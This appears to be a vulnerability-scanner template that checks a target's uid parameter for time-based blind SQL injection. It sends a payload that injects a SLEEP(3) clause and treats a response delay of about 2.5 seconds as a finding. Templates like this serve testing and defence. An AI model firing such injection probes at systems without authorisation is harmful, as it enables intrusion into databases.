id: sqli-time3-270
name: 'Delay probe in uid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via uid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      uid:
        - ''')%09AND%09SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
